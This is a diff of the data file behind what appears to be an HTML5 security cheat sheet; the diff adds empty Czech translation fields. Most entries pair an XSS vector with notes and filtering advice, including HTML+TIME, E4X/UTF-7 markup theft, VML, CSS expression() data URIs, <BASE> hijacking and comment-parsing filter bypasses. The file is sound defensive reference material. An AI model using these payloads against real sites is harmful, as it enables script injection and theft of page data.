             'ja' : '',
             'ru' : 'Введите значение в поле ввода, чтобы увидеть, как атрибуты onforminput и onformchange могут контролировать активность в теге <FORM> даже за пределами этого тега с помощью атрибута form тега <button> .',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#broadcast-formchange-events'],
@@ -692,6 +760,7 @@ var items =
             'en' : 'Make sure users cannot submit markup including the form, "onformchange" and "onforminput" attributes. Do not apply <FORM> elements with an "id" attribute.',
             'ja' : '',
             'ru' : 'Убедитесь, что пользовательский ввод не может содержать атрибуты onformchange, onforminput и form. Избегайте атрибут id в теге <FORM>.',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -707,6 +776,7 @@ var items =
             'en' : 'JavaScript execution via HTML+TIME without user interaction (1)',
             'ja' : '',
             'ru' : 'Активный скриптинг с применением технологии HTML+TIME (1)',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=%js_alert%&gt;`>',
@@ -714,6 +784,7 @@ var items =
             'en' : 'This obfuscated vector uses HTML+TIME to execute JavaScript without user interaction - and without suspicious event handlers but just "attributename" and "to" attributes.',
             'ja' : '',
             'ru' : 'Этот слегка обфусцированный вектор использует HTML+TIME для исполнения JavaScript без взаимодействия с пользователем и без подозрительных обработчиков событий исключительно с помощью атрибутов attributename и to. ',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx'],
@@ -721,6 +792,7 @@ var items =
             'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags. The rather unknown HTML+TIME API provides too many ways to execute JavaScript with and without user interaction on exotic ways. Avoid blacklists if possible.',
             'ja' : '',
             'ru' : 'Не разрешайте свойства поведений в пользовательских стилях и разметке и не полагайтесь на черные списки в отношении опасных HTML-тегов. Малоизвестные HTML+TIME API предоставляют довольно много экзотических способов исполнения JavaScript, в т.ч. без взаимодействия с пользователем. Избегайте черных списков, если это возможно.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -736,6 +808,7 @@ var items =
             'en' : 'Self-including E4X-based JavaScript snippet',
             'ja' : '',
             'ru' : 'Самовключаемый JavaScript фрагмент, основанный на E4X',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<script src="#">{%js_alert%}</script>;1',
@@ -743,6 +816,7 @@ var items =
             'en' : 'This <SCRIPT> tag tries to include the very same page it is being executed from - and then executes the {}-delimited E4X payload. To avoid having Firefox throw an error during inclusion the ending sequence ;0 is necessary.',
             'ja' : '',
             'ru' : 'Этот тег <SCRIPT> пытается использовать ту же самую страницу в качестве своего содержимого. Если содержимое страницы правильно с точки зрения XML-синтаксиса, она будет разобрана в JavaScript в качестве E4X-строки. При этом произойдет выполнение полезной нагрузки, содержащейся внутри E4X-разделителя - {}. Чтобы избежать возможную ошибку во время включения, необходимо окончание в виде ;0 и т.п.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['https://developer.mozilla.org/en/E4X'],
@@ -750,6 +824,7 @@ var items =
             'en' : 'E4X is extremely dangerous since any page can include sources providing valid XML and the mentioned semi-colon delimiter. For effective protection websites must be applied with a DOCTYPE - or contain invalid markup. There are many variations for the ending delimiter - as long it is valid JavaScript and not indicating the page is XML only it will work (;1, ,1, ._, etc..)',
             'ja' : '',
             'ru' : 'E4X является чрезвычайно опасным, если исходный код страницы является правильным с т.зр. XML и содержит разделители в виде точек с запятой. Для эффективной защиты сайты должны применять DOCTYPE или содержать неправильную разметку. Существует много вариантов для оканчивающего разделителя: если это правильный JavaScript, и страница не является исключительно XML, то будут работать ";1", ",1", "._" и т.д.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -765,6 +840,7 @@ var items =
             'en' : 'E4X-based UTF-7 JavaScript/HTML snippet stealing cross-domain markup',
             'ja' : '',
             'ru' : 'Кодированный UTF-7 JavaScript/HTML фрагмент на основе E4X для междоменного доступа к разметке',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);',
@@ -772,6 +848,7 @@ var items =
             'en' : 'In case an attacker can inject the character sequence beginning with .toXMLString() it\'s possible to include the victimized website in a <SCRIPT> tag loaded from an arbitrary page and steal the markup of the included page - across domain and protocol borders. Note that the whole vector is encoded in UTF-7. This is possible since the including <SCRIPT> tag can decide via charset attribute what charset to use.',
             'ja' : '',
             'ru' : 'В случае, если атакующий может внедрить последовательность символов, начинающихся с .toXMLString(), существует возможность включения уязвимого сайта в качестве содержимого тега <SCRIPT>, запускаемого с удаленной страницы, с последующим присвоением разметки включенной страницы независимо от протокола и домена. Обратите внимание, что весь вектор кодируется в UTF-7. Это возможно, поскольку в теге <SCRIPT> можно указать кодировку с помощью атрибута charset.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['https://developer.mozilla.org/en/E4X'],
@@ -779,6 +856,7 @@ var items =
             'en' : 'Make sure all sites are being applied with a defined charset like UTF-8. Also incoming data should be converted from UTF-7 before being escaped with htmlentities() or comparable methods. All websites containing sensitive data should be applied with a DOCTYPE.',
             'ja' : '',
             'ru' : 'Убедитесь, что ко всем страницам применяется определенная UTF-8 кодировка. Кроме того, входящие данные должны быть преобразованы из UTF-7, прежде чем будут обработаны с помощью htmlentities() или похожих методов. Все страницы, содержащие конфиденциальные данные, должны использовать DOCTYPE.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -794,6 +872,7 @@ var items =
             'en' : 'Opera whole-page click hijacking via CSS',
             'ja' : '',
             'ru' : 'Перехват нажатия на любом теге страницы с помощью CSS для Opera',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<style>p[foo=bar{}*{-o-link:\'%js_uri_alert%\'}{}*{-o-link-source:current}]{color:red};</style>',
@@ -801,6 +880,7 @@ var items =
             'en' : 'Opera as well as other browsers allow to break out attribute selectors and other CSS constructs with {...} - opening the possibility for declaring new properties and assigning values - such as -o-link and -o-link-source. In this case those proprietary properties allow overlaying any selected element with a JavaScript URI link href.',
             'ja' : '',
             'ru' : 'Opera, как и другие браузеры, допускают выход за пределы селектора и других CSS-конструкций с помощью {...}, что открывает возможность для декларирования новых свойств и их значений, создавая видимость продолжения селектора.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.aptana.com/reference/html/api/CSS.field.-o-link-source.html'],
@@ -808,6 +888,7 @@ var items =
             'en' : 'In case users are allowed to submit CSS make sure the properties allowed are whitelisted and attribute selector content does not allow the combination {...} because it breaks out the attribute selector and allows declaration of new properties.',
             'ja' : '',
             'ru' : 'В случае, если пользователи имеют возможность изменять CSS, убедитесь, что свойства занесены в "белый список", а селекторы не содержат сочетание {...} .',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -823,6 +904,7 @@ var items =
             'en' : 'JavaScript execution via HTML+TIME without user interaction (2)',
             'ja' : '',
             'ru' : 'Активный скриптинг с применением технологии HTML+TIME (2)  ',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=%js_alert%&gt;>',
@@ -830,6 +912,7 @@ var items =
             'en' : 'This HTML+TIME vector utilized the attributes "attributename" and "values" to map ecoded markup into an attribute to execute JavaScript.',
             'ja' : '',
             'ru' : 'Этот HTML+TIME вектор использует атрибуты attributename и values для изменения значения свойства innerHTML у анимируемого объекта. Нужно иметь в виду, что посредством тегов set и animate можно менять и другие свойства объектов (например, src или href). Отличие animate от set состоит в том, что анимировать возможно только то свойство, которое уже имеет начальное значение. Если свойство не имеет начальное значение, то можно прибегнуть к использованию сочетания атрибутов from и to в теге animate. Также не стоит упускать возможность указать целевой тег для анимирования в атрибуте targetElement.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx'],
@@ -837,6 +920,7 @@ var items =
             'en' : 'As soon as the HTML+TIME namespace and the behavior property are mapped to a HTML element a whole range of new attributes to execute JavaScript is available. In user submitted html "xmlns" attributes should not be allowed - as well as "behavior" properties for style tags and attribtes. Don\'t rely on blacklisting when dealing with user submitted markup.',
             'ja' : '',
             'ru' : 'Как только пространство имен и поведение HTML+TIME привязаны к тегу, становятся доступными целый ряд новых атрибутов, с помощью которых возможно выполнение JavaScript. В пользовательской разметке не должно быть разрешено использование атрибута xmlns, а также свойств поведений в стилях. Избегайте черных списков при работе с пользовательской разметкой.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -852,6 +936,7 @@ var items =
             'en' : 'JavaScript execution via <LINK> href attribute and data URI',
             'ja' : '',
             'ru' : 'Выполнение JavaScript с помощью атрибута href и data URI в теге <LINK>',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<link rel=stylesheet href=data:,*%7bx:expression(%js_write%)%7d',
@@ -859,6 +944,7 @@ var items =
             'en' : 'Despite the existing documentation Internet Explorer 8 supports data URIs not only for displaying images but also supplying stylesheet information. This can be used to wrap expression() CSS into a data URI and execute JavaScript with a <LINK> tag.',
             'ja' : '',
             'ru' : 'Несмотря на имеющуюся документацию Internet Explorer 8 поддерживает схему data URI не только для вывода изображений, но также и для представления стилевой информации. Это может быть использовано для сокрытия expression() внутри data URI и вызова JavaScript в теге <LINK>.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -866,6 +952,7 @@ var items =
             'en' : 'Make sure stylesheet URIs cannot be controlled by the user - and user submitted  <LINK> tags will not be displayed unfiltered.',
             'ja' : '',
             'ru' : 'Убедитесь, что стилевые URI не могут быть в полной мере подконтрольны пользователю, а пользовательские теги LINK не выводятся неотфильтрованными.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -881,6 +968,7 @@ var items =
             'en' : 'JavaScript execution via <STYLE> @import and data URI',
             'ja' : 'Выполнение JavaScript с помощью @import и data URI в теге <STYLE>',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<style>@import "data:,*%7bx:expression(%js_write%)%7D";</style>',
@@ -888,6 +976,7 @@ var items =
             'en' : 'Despite the existing documentation Internet Explorer 8 supports data URIs not only for displaying images but also supplying stylesheet information. This can be used to wrap expression() CSS into a data URI and execute JavaScript with a <STYLE> @import directive.',
             'ja' : '',
             'ru' : 'Несмотря на имеющуюся документацию Internet Explorer 8 поддерживает схему data URI не только для вывода изображений, но также и для представления стилевой информации. Это может быть использовано для сокрытия expression() внутри data URI и вызова JavaScript c помощью директивы @import тега <STYLE>.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://msdn.microsoft.com/en-us/library/ms530768%28VS.85%29.aspx'],
@@ -895,6 +984,7 @@ var items =
             'en' : 'Make sure stylesheet URIs cannot be controlled by the user - and user submitted  <STYLE> cannot contain the @import directive.',
             'ja' : '',
             'ru' : 'Убедитесь, что стилевые URI не могут быть в полной мере подконтрольны пользователю, а пользовательские стили не содержат директиву @import.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -910,6 +1000,7 @@ var items =
             'en' : 'JavaScript execution via <FRAMESET> and onload',
             'ja' : '',
             'ru' : 'Выполнение JavaScript с помощью <FRAMESET> и onload',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<frameset onload=%js_alert%>',
@@ -917,6 +1008,7 @@ var items =
             'en' : 'This classic vector shows that several tags don\'t need a "src" attribute to fire onload events, such as <IFRAME>, <BODY> and <FRAMESET>.',
             'ja' : '',
             'ru' : 'Этот классический вектор демонстрирует, что некоторые теги (такие, как <IFRAME>, <BODY> и <FRAMESET>) не требуют атрибута src для запуска обработчика onload.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -924,6 +1016,7 @@ var items =
             'en' : 'Be sure to work with whitelists when allowing users to submit markup - else ancient tags like <FRAMESET> might be forgotten to filter and escape.',
             'ja' : '',
             'ru' : 'Убедитесь, что работаете с белым списком, когда принимаете пользовательскую разметку, в ином случае такие устаревшие теги, как <FRAMESET>, могут быть упущены из внимания при фильтрации.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -943,6 +1036,7 @@ var items =
             'en' : 'JavaScript execution via <TABLE> and background',
             'ja' : '',
             'ru' : 'Выполнение JavaScript с помощью <TABLE> и background',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<table background="javascript:%js_alert%">',
@@ -950,6 +1044,7 @@ var items =
             'en' : 'Opera 8-10.5+ as well as Internet Explorer 6 support JavaScript URIs for <TABLE> and some other tags\' "background" attributes. This causes JavaScript execution without user interaction.',
             'ja' : '',
             'ru' : 'Opera 8-10.5+ , а также Internet Explorer 6 поддерживают псевдоскрипт в теге <TABLE> и некоторых других тегах в атрибуте background. Это открывает возможность выполнения JavaScript без участия пользователя.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -957,6 +1052,7 @@ var items =
             'en' : 'In case evil attributes like event handlers are being filtered from user submitted markup make sure not to forget "background" - among others.',
             'ja' : '',
             'ru' : 'Убедитесь, что при фильтрации пользовательской разметки среди прочих не забыт и атрибут background.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -973,6 +1069,7 @@ var items =
             'en' : 'Breaking pointer-events:none with nested links',
             'ja' : '',
             'ru' : 'Прерывание pointer-events:none вложенной ссылкой',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="%js_alert%;">XXX</a></a><a href="%js_uri_alert_2%">XXX</a>',
@@ -980,6 +1077,7 @@ var items =
             'en' : 'Firefox 3.6+ allows using CSS "pointer-events"  with value "none" to make sure an element will not react on any mouse/pointer based event. This feature enables for example placing a DIV over another DIV without blocking the click events addressed to the underlying DIV.',
             'ja' : '',
             'ru' : 'Firefox 3.6+ позволяет использовать CSS-свойство pointer-events со значением none, чтобы элемент не реагировал на какие-либо события указателей. Это свойство позволяет, например, позиционировать элемент DIV поверх другого DIV без блокировки событий нажатия, адресованных первому.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://hacks.mozilla.org/2009/12/pointer-events-for-html-in-firefox-3-6/'],
@@ -987,6 +1085,7 @@ var items =
             'en' : 'The feature breaks as soon as <A> elements are being used in combination with "pointer-events:none" - containing other <A> elements. <A> elements should not be used for pointer-event logic at all - especially not when containing user controlled HTML.',
             'ja' : '',
             'ru' : 'Свойство прерывается, как только тег <A>, используемый в сочетании с pointer-events:none, содержит другой тег <A>. Теги <A> не должны использоваться в логике pointer-events в целом, и в особенности тогда, когда они могут содержать контролируемую пользователем разметку.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -1002,6 +1101,7 @@ var items =
             'en' : 'VML frame with embedded VML object plus onmouseover',
             'ja' : '',
             'ru' : 'VML фрейм с помещенным в него VML объектом плюс onmouseover',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%vml_path%#xss></vmlframe>',
@@ -1016,6 +1116,7 @@ var items =
             'en' : 'A VML frame object works by giving the VML frame a "src" attribute and have it point to another VML object. A VML frame object in quirks mode can enclose a VML rect object or regular HTML which is responding to mouseover events.',
             'ja' : '',
             'ru' : 'Объект VML-фрейма ссылается в атрибуте src на другой VML-объект, который реагирует на событие движения мышью. В режиме совместимости VML-фрейм может непосредственно заключать в себе VML-rect объект или обычный HTML.', 
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://msdn.microsoft.com/en-us/library/bb263900%28VS.85%29.aspx'],
@@ -1023,6 +1124,7 @@ var items =
             'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags.',
             'ja' : '',
             'ru' : 'Не разрешайте свойства поведений в пользовательских стилях и разметке и не полагайтесь на черные списки опасных HTML-тегов.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -1038,6 +1140,7 @@ var items =
             'en' : 'VML line object utilizing href attribute with JavaScript URI',
             'ja' : '',
             'ru' : 'VML объект line использует атрибут href c псевдоскриптом.',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=%js_uri_alert% strokecolor=white strokeweight=1000px from=0 to=1000 /></a>',
@@ -1045,6 +1148,7 @@ var items =
             'en' : 'The vector paints a very thick and wide line responding to clicks with JavaScript execution via JavaScript URI. Note that the actual URI is being masked in the status bar. During an overlay attack the victim will not know about the payload via status bar.',
             'ja' : '',
             'ru' : 'Данный вектор рисует очень длинную и широкую линию, нажатие на которую приведет к исполнению JavaScript. Обратите внимание, что псевдоскрипт маскируется в статусной строке, поэтому потерпевший не будет знать об истинной полезной нагрузке. Такой же эффект имеет место и в остальных графических VML-тегах.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://msdn.microsoft.com/en-us/library/bb229513%28VS.85%29.aspx'],
@@ -1052,6 +1156,7 @@ var items =
             'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags.',
             'ja' : '',
             'ru' : 'Не разрешайте свойства поведений в пользовательских стилях и разметке и не полагайтесь на черные списки опасных HTML-тегов.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -1067,6 +1172,7 @@ var items =
             'en' : 'AnchorClick behavior enabling folder attribute as href replacement',
             'ja' : '',
             'ru' : 'Поведение AnchorClick',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<a style="behavior:url(#default#AnchorClick);" folder="%js_uri_alert%">XXX</a>',
@@ -1074,6 +1180,7 @@ var items =
             'en' : 'Using the AnchorClick behavior allows to use the "folder" attribute as replacement for a "href" attribute on <A> elements.',
             'ja' : '',
             'ru' : 'Использование поведения AnchorClick позволяет заменить в теге <A> атрибут href атрибутом folder, содержащим полезную нагрузку.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://msdn.microsoft.com/en-us/library/ms531414%28VS.85%29.aspx'],
@@ -1081,6 +1188,7 @@ var items =
             'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags.',
             'ja' : '',
             'ru' : 'Не разрешайте свойства поведений в пользовательских стилях и разметке и не полагайтесь на черные списки опасных HTML-тегов.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -1096,6 +1204,7 @@ var items =
             'en' : 'HTML comment parsing issues (1)',
             'ja' : '',
             'ru' : 'Разбор комментариев в HTML (1)',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<!--<img src="--><img src=x onerror=%js_alert%//">',
@@ -1103,6 +1212,7 @@ var items =
             'en' : 'This vector shows how comments are being parsed and what problems can arise in case user submitted HTML is allowed to contain comments.',
             'ja' : '',
             'ru' : 'Этот пример показывает, как в настоящее время разбираются комментарии, и какие проблемы могут возникнуть в случае, если пользовательская разметка может содержать комментарии.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1110,6 +1220,7 @@ var items =
             'en' : 'Make sure comments are not allowed in user submitted html. The markup should be checked for security issues after comments have been stripped out - not before.',
             'ja' : '',
             'ru' : 'Убедитесь, что комментарии не разрешены в пользовательской разметке. Разметка должна проверяться для целей безопасности только после удаления комментариев, но не до того.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -1129,6 +1240,7 @@ var items =
             'en' : 'HTML comment parsing issues (2)',
             'ja' : '',
             'ru' : 'Разбор комментариев в HTML (2)',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<comment><img src="</comment><img src=x onerror=%js_alert%)//">',
@@ -1136,6 +1248,7 @@ var items =
             'en' : 'Besides <!---> the Internet Explorer allows to use <COMMENT> tags. The vector shows how comments are being parsed and what problems can arise in case user submitted HTML is allowed to contain comments.',
             'ja' : '',
             'ru' : 'Вместо <!---> Internet Explorer разрешает использовать тег <COMMENT>. Этот пример также показывает, как разбираются комментарии, и какие проблемы могут возникнуть в случае, если пользовательская разметка может их содержать.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1143,6 +1256,7 @@ var items =
             'en' : 'Make sure <COMMENT> tags are not allowed in user submitted html. The markup should be checked for security issues after <COMMENT> tags have been stripped out or escaped - not before. ',
             'ja' : '',
             'ru' : 'Убедитесь, что тег <COMMENT> не разрешен в пользовательской разметке. Разметка должна проверяться для целей безопасности только после удаления тегов <COMMENT>.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -1158,6 +1272,7 @@ var items =
             'en' : 'CDATA section parsing issues',
             'ja' : '',
             'ru' : 'Разбор CDATA-секций',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<![><img src="]><img src=x onerror=%js_alert%//">',
@@ -1165,6 +1280,7 @@ var items =
             'en' : 'Firefox and Opera allow using CDATA section delimiters in HTML - in the stripped form "<![" as well as including padding like "<![CDATA[". This can cause problems for filter mechanisms since those delimiters can be used for massive obfuscation.',
             'ja' : '',
             'ru' : 'Firefox и Opera разрешают использовать разделители CDATA-секций в HTML. В сокращенной форме "<![" то же самое, что и "<![CDATA[". Это может породить проблемы для механизма фильтрации, поскольку эти разделители могут быть использованы для обфускации.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1172,6 +1288,7 @@ var items =
             'en' : 'Make sure CDATA delimiters are not allowed in user submitted html. The markup should be checked for security issues after CDATA sections nd delimiters have been stripped out or escaped - not before.',
             'ja' : '',
             'ru' : 'Убедитесь, что CDATA-разделители не разрешены в пользовательской разметке. Разметка должна проверяться для целей безопасности только после удаления CDATA-секций.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -1188,6 +1305,7 @@ var items =
             'en' : 'Plaintext tags used for markup obfuscation',
             'ja' : '',
             'ru' : 'Текстовые теги, используемые для обфускации разметки',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<style><img src="</style><img src=x onerror=%js_alert%//">',
@@ -1195,6 +1313,7 @@ var items =
             'en' : 'This vector works on all tested user agents and shows how several filtering solutions can be tricked into accepting malicious HTML. A badly written filter will assume the error handler is part of the first image\'s "src" attribute and accept the incoming data.',
             'ja' : '',
             'ru' : 'Этот вектор работает на всех протестированных пользовательких агентах и показывает, как могут быть преодолены некотрые правила фильтрации, запрещающие обработчики событий в качестве атрибутов. Вместо тега <STYLE> может быть использован любой plaintext-тег.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1202,6 +1321,7 @@ var items =
             'en' : 'Don\'t rely on weak regular express for markup filtering. Use whitelists for allowed tags and rely on a filter solution based on a heavily tested tokenizer/parser.',
             'ja' : '',
             'ru' : 'Не полагайтесь исключительно на регулярные выражения для фильтрации разметки. Используйте белые списки разрешенных тегов и полагайтесь на фильтры, основанные на хорошо тестированных сигнатурах и анализаторах.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -1221,6 +1341,7 @@ var items =
             'en' : 'Error handler via empty list-style and load handler via empty content',
             'ja' : '',
             'ru' : 'Свойства content, list-style как способ автоматического исполнения кода',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<li style=list-style:url() onerror=%js_alert%>\n<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=%js_alert%></div>',
@@ -1228,6 +1349,7 @@ var items =
             'en' : 'Opera 10.5+ and earlier versions fire an error event for <LI> tags in case the background URL via style attribute cannot be loaded. The same works with "list-style-image" too. On Opera 10.10 and earlier more tag/style combinations like background:url() and background-image:url() work as well. Also works combination like content:url(svg).',
             'ja' : '',
             'ru' : 'Opera 10.5+ и ниже генерирует событие error для тега <LI> в случае, если URL свойства background не может быть загружен. То же самое действительно для свойства list-style-image. На Opera 10.10 и ниже этот прицип имел универсальный характер, то есть мог быть использован в любом теге. Универсальный характер в Opera 10 и выше имеет комбинация content плюс обработчик onload.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1235,6 +1357,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -1250,6 +1373,7 @@ var items =
             'en' : 'Link hijacking via <BASE> and JavaScript URI',
             'ja' : '',
             'ru' : 'Перехват ссылки с помощью тега <BASE> и псевдоскипта',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<head><base href="javascript://"></head><body><a href="/./,%js_alert%//#">XXX</a></body>',
@@ -1257,6 +1381,7 @@ var items =
             'en' : '<BASE> link hijacking with JavaScript URIs works on Internet Explorer, Opera (O8-10.5 in case the link URL starts with #) and Safari. User interaction is required to execute the JavaScript. The vector sometimes has to be changed slightly to work for all mentioned user agents.',
             'ja' : '',
             'ru' : 'Этот вектор работает в Internet Explorer, Opera (O8-10.5 в случае, если URL ссылки начинается с #) и Safari. Для выполнения JavaScript необходимо взаимодействие с пользователем. Вектор иногда приходится слегка изменять для работоспособности во всех заявленных браузерах.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1264,6 +1389,7 @@ var items =
             'en' : 'User submitted HTML should not allow usage of <BASE> tags. In case they are necessary no non-HTTP/non-relative URL schemes should be allowed.',
             'ja' : '',
             'ru' : 'Пользовательская разметка не должна содержать тег <BASE>. Если это возможно, должны быть запрещены все URL, не являющиеся относительными или не начинающиеся с "http://".',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -1281,6 +1407,7 @@ var items =
             'en' : 'Opera 10 SVG font XSS',
             'ja' : '',
             'ru' : 'XSS через SVG-шрифт в Opera 10',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<?xml version="1.0" standalone="no"?><html xmlns="http://www.w3.org/1999/xhtml"><head><style type="text/css">@font-face {font-family: y; src: url("%svg_front_path%#x") format("svg");} body {font: 100px "y";}</style></head><body>Hello</body></html>',
@@ -1295,6 +1422,7 @@ var items =
             'en' : 'Opera 10.00 and later minor versions allow using SVG fonts and will - as soon as the font file has loaded even execute embedded JavaScript. The current example utilizes a load event handler to execute the JavaScript without user interaction as soon as the font file has been fully loaded.',
             'ja' : '',
             'ru' : 'Opera 10.00 и меньшие версии вплоть до 9-й разрешают использовать SVG-шрифты с активным содержимым. При этом, как только будет загружен файл шрифта, автоматически выполнится внедренный в него JavaScript, что и показано в данном примере.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1302,6 +1430,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -1317,6 +1446,7 @@ var items =
             'en' : 'Opera @import based XSS inside attribute selectors',
             'ja' : '',
             'ru' : 'XSS с помощью @import внутри атрибута селектора',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<style>*[{}@import\'%css_path%?]</style>X',
@@ -1331,6 +1461,7 @@ var items =
             'en' : 'Opera 10 and later version including latest Opera 10.5 allow breaking out an attribute selector with {} and use @import declarations afterwards. The MIME type for the imported file does not matter - also it can be loaded from arbitrary domains. The imported file contains CSS code to apply a JavaScript URI to all elements on the page to hijack any incoming click.',
             'ja' : '',
             'ru' : 'Opera 10 и более поздние версии, включая Opera 10.5, позволяют прервать атрибут селектора с помощью конструции {} и использовать затем правило @import. MIME-тип и домен импортируемого файла значения не имеют. Данный файл содержит CSS код, перехватывающий нажатие на любом теге для выполнения JavaScript. Смысл закрывающей квадратной скобки состоит в создании видимости целостности атрибута селектора.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1338,6 +1469,7 @@ var items =
             'en' : 'Make sure in user submitted CSS the contents of attribute selectors are properly escaped with backslashes. Also make sure to use a CSS property:value whitelist to forbid properties like -o-link and -o-link-source.',
             'ja' : '',
             'ru' : 'Убедитесь, что в пользовательских стилях содержание атрибута селектора надлежащим образом эскейпируется обратными слешами. Также убедитесь, что используете белый список при работе с CSS, чтобы не допустить такие свойства, как -o-link и -o-link-source.',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -1353,6 +1485,7 @@ var items =
             'en' : 'CSS-string breaking',
             'ja' : '',
             'ru' : 'Разрыв CSS-строки',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<div style="background:url(\'/foo/&#x0A);color:red;\');">XXX',
@@ -1360,6 +1493,7 @@ var items =
             'en' : 'Opera, Firefox and other browsers allow breaking out an css-string with newline symbols. A string cannot directly contain a newline in CSS2+.',
             'ja' : '',
             'ru' : 'Оpera, Firefox, а также другие браузеры позволяют прервать css-строку с помощью символов новой строки. Строка не может непосредственно содержать символ новой строки согласно стандартам CSS уровня 2 и выше. Фильтры, которые не учитывают эту особенность, будут неправильно определять опасные свойства стилей.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1367,6 +1501,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -1385,6 +1520,7 @@ var items =
             'en' : 'Alternative css-syntax in Internet Explorer',
             'ja' : '',
             'ru' : 'Альтернативный css-синтаксис в Internet Explorer',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<div style="font-family:foo}color=red;">XXX',
@@ -1392,6 +1528,7 @@ var items =
